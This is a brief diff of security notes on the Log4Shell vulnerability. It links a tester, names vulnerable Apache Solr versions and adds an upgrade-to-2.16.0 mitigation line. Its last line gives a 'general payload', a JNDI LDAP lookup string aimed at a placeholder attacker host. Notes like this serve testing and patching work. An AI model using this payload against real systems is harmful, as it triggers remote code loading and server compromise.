@@ -5,6 +5,7 @@ Millions of applications as well as software providers use this package as a dep
 Log4j Vuln Tester - https://log4shell.huntress.com/
 
 APACH SOLR 8.10.0 & below are vuln
+Upgrade to Log4j 2.16.0 to mitigate
 ---------------------------------------------------------
 general payload 
 ${jndi:ldap://ATTACKERCONTROLLEDHOST}
